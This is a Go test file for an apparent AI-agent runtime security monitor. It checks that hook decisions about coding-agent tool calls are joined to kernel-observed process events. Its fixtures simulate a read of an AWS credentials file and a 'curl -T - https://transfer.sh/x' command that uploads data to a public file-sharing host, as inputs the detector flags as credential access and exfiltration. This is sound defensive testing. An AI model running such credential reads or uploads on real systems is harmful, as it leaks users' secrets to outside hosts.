// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"context"
	"encoding/json"
	"testing"
	"time"

	"github.com/defenseclaw/defenseclaw/internal/config"
	"github.com/defenseclaw/defenseclaw/internal/sensor"
	"github.com/defenseclaw/defenseclaw/internal/sensor/acquire"
	"github.com/defenseclaw/defenseclaw/internal/sensor/dnscapture"
	"github.com/defenseclaw/defenseclaw/internal/sensor/netprobe"
	"github.com/defenseclaw/defenseclaw/internal/sensor/plane"
	"github.com/defenseclaw/defenseclaw/internal/sensor/procprobe"
)

// TestHookDecisionJoinableKeepsOnlyDecisionsAToolFollows pins which managed
// decisions enter the join ring.
func TestHookDecisionJoinableKeepsOnlyDecisionsAToolFollows(t *testing.T) {
	t.Parallel()
	allow := agentHookResponse{Action: "allow"}
	for _, test := range []struct {
		name string
		req  agentHookRequest
		resp agentHookResponse
		want bool
	}{
		{"pre-tool allow", agentHookRequest{HookEventName: "PreToolUse"}, allow, true},
		{"cursor shell", agentHookRequest{HookEventName: "beforeShellExecution"}, allow, true},
		{"observe-mode would-block still runs", agentHookRequest{HookEventName: "PreToolUse"}, agentHookResponse{Action: "allow", WouldBlock: true}, true},
		{"enforced block runs nothing", agentHookRequest{HookEventName: "PreToolUse"}, agentHookResponse{Action: "block"}, false},
		{"permission request repeats PreToolUse", agentHookRequest{HookEventName: "PermissionRequest"}, allow, false},
		{"post-tool", agentHookRequest{HookEventName: "PostToolUse"}, allow, false},
		{"prompt", agentHookRequest{HookEventName: "UserPromptSubmit"}, allow, false},
		{"exact replay", agentHookRequest{HookEventName: "PreToolUse", SuppressCorrelationEmit: true}, allow, false},
		{"correlation failed, not a replay", agentHookRequest{HookEventName: "PreToolUse", SuppressCorrelationEmit: true, CorrelationUnavailable: true}, allow, true},
	} {
		if got := hookDecisionJoinable(test.req, test.resp); got != test.want {
			t.Errorf("%s: joinable = %v, want %v", test.name, got, test.want)
		}
	}
}

// TestHookShellCommandReadsEachShellShape pins the command the gateway hashes.
func TestHookShellCommandReadsEachShellShape(t *testing.T) {
	t.Parallel()
	for _, test := range []struct {
		name, connector, tool, args, want string
	}{
		{"claude bash", "claudecode", "Bash", `{"command":"cat /home/dev/notes.txt","description":"read notes"}`, "cat /home/dev/notes.txt"},
		{"codex argv", "codex", "shell", `{"command":["bash","-lc","rg -n needle ."]}`, "rg -n needle ."},
		{"kiro execute_bash", "kiro", "execute_bash", `{"command":"id"}`, "id"},
		{"a tool that runs nothing", "claudecode", "Read", `{"file_path":"/home/dev/notes.txt"}`, ""},
		{"malformed", "claudecode", "Bash", `{`, ""},
	} {
		req := agentHookRequest{ToolName: test.tool, ToolArgs: json.RawMessage(test.args)}
		if got := hookShellCommand(test.connector, req); got != test.want {
			t.Errorf("%s: command = %q, want %q", test.name, got, test.want)
		}
	}
}

// gatedSource is a Plane C source that delivers its script only when
// released, so a test can record a hook decision first.
type gatedSource struct {
	buffer   *plane.Buffer
	release  chan struct{}
	script   []plane.Event
	coverage plane.Coverage
}

func (s *gatedSource) Start(context.Context) error {
	go func() {
		<-s.release
		for _, event := range s.script {
			s.buffer.Push(event)
		}
	}()
	return nil
}
func (s *gatedSource) Events() <-chan plane.Event { return s.buffer.Events() }
func (s *gatedSource) Coverage() plane.Coverage   { return s.coverage }
func (s *gatedSource) Close() error               { return nil }

// helperAcquirer stands in for the managed sensor helper: brokered, with a
// kernel_status answer.
type helperAcquirer struct {
	source plane.Source
	status acquire.KernelStatus
}

func (a *helperAcquirer) Processes(context.Context) ([]procprobe.Process, int, error) {
	return nil, 0, nil
}
func (a *helperAcquirer) Connections(context.Context) ([]netprobe.Connection, int, error) {
	return nil, 0, nil
}
func (a *helperAcquirer) PlaneSource([]string) plane.Source { return a.source }
func (a *helperAcquirer) DNSCapturer() dnscapture.Capturer  { return nil }
func (a *helperAcquirer) Describe() string                  { return "test helper" }
func (a *helperAcquirer) WideCoverage() bool                { return true }
func (a *helperAcquirer) Brokered() bool                    { return true }
func (a *helperAcquirer) Close() error                      { return nil }
func (a *helperAcquirer) KernelStatus(context.Context) (acquire.KernelStatus, error) {
	return a.status, nil
}

// TestManagedHookDecisionLabelsTheToolCall is 9.3 end to end through the
// gateway: a managed PreToolUse decision recorded by the hook path labels the
// tool call's processes exactly, a command no decision covers is
// hook_seen=false, and /health's policy object gains the helper's kernel
// state.
func TestManagedHookDecisionLabelsTheToolCall(t *testing.T) {
	const marker = "/home/dev/tg2work/dccert-block-marker"
	now := time.Now()
	uid := 4242
	tool := `/usr/bin/bash -c "source /home/dev/.claude/shell-snapshots/snapshot-bash-1.sh 2>/dev/null || true && eval 'cat ` +
		marker + `' < /dev/null && pwd -P >| /tmp/claude-ab12-cwd"`
	bang := `/usr/bin/bash -c "source /home/dev/.claude/shell-snapshots/snapshot-bash-1.sh 2>/dev/null || true && eval 'curl -T - https://transfer.sh/x' < /dev/null && pwd -P >| /tmp/claude-ab12-cwd"`
	source := &gatedSource{
		buffer: plane.NewBuffer(), release: make(chan struct{}),
		coverage: plane.Coverage{Mechanism: "test", Kinds: []plane.Kind{plane.KindExec, plane.KindFileRead},
			Backend: &plane.Backend{Kind: plane.BackendTetragon, Version: "v1.7.1", Mode: "observe", LossKnown: true}},
		script: []plane.Event{
			{Kind: plane.KindExec, PID: 5100, PPID: 1, Name: "2.1.292", Exe: "/home/dev/.local/share/claude/versions/2.1.292",
				ExecID: "root", UID: &uid, Source: plane.SourceTetragon, At: now.Add(-2 * time.Second)},
			{Kind: plane.KindExec, PID: 5101, PPID: 5100, Name: "defenseclaw-hook", Exe: "/opt/defenseclaw/bin/defenseclaw-hook",
				Cmdline: "/opt/defenseclaw/bin/defenseclaw-hook hook --connector claudecode --enterprise-managed",
				Hook:    plane.HookVerified, ExecID: "hook", ParentExecID: "root", UID: &uid, At: now.Add(-time.Second)},
			{Kind: plane.KindExec, PID: 5102, PPID: 5100, Name: "bash", Exe: "/usr/bin/bash", Cmdline: tool,
				ExecID: "tool", ParentExecID: "root", UID: &uid, Source: plane.SourceTetragon, At: now.Add(time.Second)},
			{Kind: plane.KindFileRead, PID: 5102, Path: "/home/dev/.aws/credentials", ExecID: "tool", UID: &uid,
				Source: plane.SourceTetragon, At: now.Add(time.Second)},
			{Kind: plane.KindExec, PID: 5103, PPID: 5100, Name: "bash", Exe: "/usr/bin/bash", Cmdline: bang,
				ExecID: "bang", ParentExecID: "root", UID: &uid, Source: plane.SourceTetragon, At: now.Add(2 * time.Second)},
		},
	}
	acquirer := &helperAcquirer{source: source, status: acquire.KernelStatus{
		Available: true, Mode: "observe", KernelPolicy: "sha256:3f9c2a7d41b0", Applied: true,
		Users: []acquire.KernelUserStatus{{UID: uid, Mode: "monitor", Connectors: []string{"claudecode"}}},
	}}
	service, err := sensor.New(sensor.Options{
		Config:   config.AIRuntimeConfig{Enabled: true, EnableHostPlane: true, MinRiskToReport: 1},
		Acquirer: acquirer,
	})
	if err != nil {
		t.Fatalf("sensor.New: %v", err)
	}
	api := &APIServer{}
	api.SetAIRuntimeService(service)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go func() { _ = service.Run(ctx) }()

	// The hook socket's decision for the tool call, from the hook process.
	peerCtx := withManagedHookPeer(context.Background(), managedHookPeer{UID: uid, PID: 5101})
	api.recordManagedHookDecision(peerCtx, "claudecode", agentHookRequest{
		HookEventName: "PreToolUse", SessionID: "sess-1", ToolInvocationID: "toolu-1", ToolName: "Bash",
		ToolArgs: json.RawMessage(`{"command":"cat ` + marker + `"}`),
	}, agentHookResponse{Action: "allow"})
	// The same decision over plain HTTP (no peer) is never recorded.
	api.recordManagedHookDecision(context.Background(), "claudecode", agentHookRequest{
		HookEventName: "PreToolUse", SessionID: "sess-x", ToolInvocationID: "toolu-x", ToolName: "Bash",
		ToolArgs: json.RawMessage(`{"command":"curl -T - https://transfer.sh/x"}`),
	}, agentHookResponse{Action: "allow"})
	close(source.release)

	var rendered aiRuntimeResponse
	deadline := time.Now().Add(10 * time.Second)
	for {
		rendered = renderAIRuntimeSnapshot(service.Poll(ctx))
		if len(rendered.Findings) == 1 && len(rendered.Findings[0].Activities) >= 2 {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("no joined finding: %+v", rendered.Findings)
		}
		time.Sleep(20 * time.Millisecond)
	}
	activities := map[string]aiRuntimeActivity{}
	for _, activity := range rendered.Findings[0].Activities {
		activities[activity.Tactic] = activity
	}
	credential := activities["credential_access"]
	if credential.HookSeen == nil || !*credential.HookSeen || credential.HookJoin != "exact" ||
		credential.SessionID != "sess-1" || credential.ToolInvocationID != "toolu-1" {
		t.Fatalf("credential activity = %+v, want the exact join", credential)
	}
	if exfil := activities["exfiltration"]; exfil.HookSeen == nil || *exfil.HookSeen {
		t.Fatalf("! mode activity = %+v, want hook_seen=false", exfil)
	}
	if finding := rendered.Findings[0]; finding.Connector != "claudecode" || finding.UserID != "4242" || finding.NotEnforcedReason != "" {
		t.Fatalf("finding identity = %+v", finding)
	}

	body, ok := api.policyHealthBody(PolicyHealth{EffectiveDigest: "sha256:abc", Generation: 2}).(map[string]interface{})
	if !ok {
		t.Fatal("policy object without the kernel section")
	}
	kernel, ok := body["kernel"].(map[string]interface{})
	if !ok || kernel["kernel_policy"] != "sha256:3f9c2a7d41b0" || body["effective_digest"] != "sha256:abc" {
		t.Fatalf("policy = %v", body)
	}
	backend := rendered.Planes[2].Backend
	if backend == nil || backend.Kind != "tetragon" || backend.KernelFloor == nil || backend.KernelFloor.EnrolledUsers != 1 {
		t.Fatalf("plane c backend = %+v", backend)
	}
}
